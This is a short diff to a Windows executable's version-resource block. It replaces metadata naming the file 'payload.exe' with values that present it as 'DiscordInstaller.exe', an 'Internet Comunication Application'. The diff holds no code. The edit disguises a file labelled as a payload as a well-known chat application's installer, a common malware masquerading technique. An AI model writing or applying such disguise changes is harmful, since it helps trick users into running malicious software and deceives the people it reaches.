@@ -8,12 +8,12 @@ FILETYPE 0x2
 	{
 		BLOCK "040904b0"
 		{
-			VALUE "FileDescription", "sussy backa"
-			VALUE "OriginalFilename", "payload.exe"
-			VALUE "CompanyName", "payload.exe"
+			VALUE "FileDescription", "Internet Comunication Application"
+			VALUE "OriginalFilename", "DiscordInstaller.exe"
+			VALUE "CompanyName", "DiscordInstaller.exe"
 			VALUE "FileVersion", "1,0,0,0"
-			VALUE "LegalCopyright", "Copyright © payload.exe"
-			VALUE "ProductName", "payload.exe"
+			VALUE "LegalCopyright", "Copyright © DiscordInstaller.exe"
+			VALUE "ProductName", "DiscordInstaller.exe"
 			VALUE "ProductVersion", "1,0,0,0"
 		}
 	}
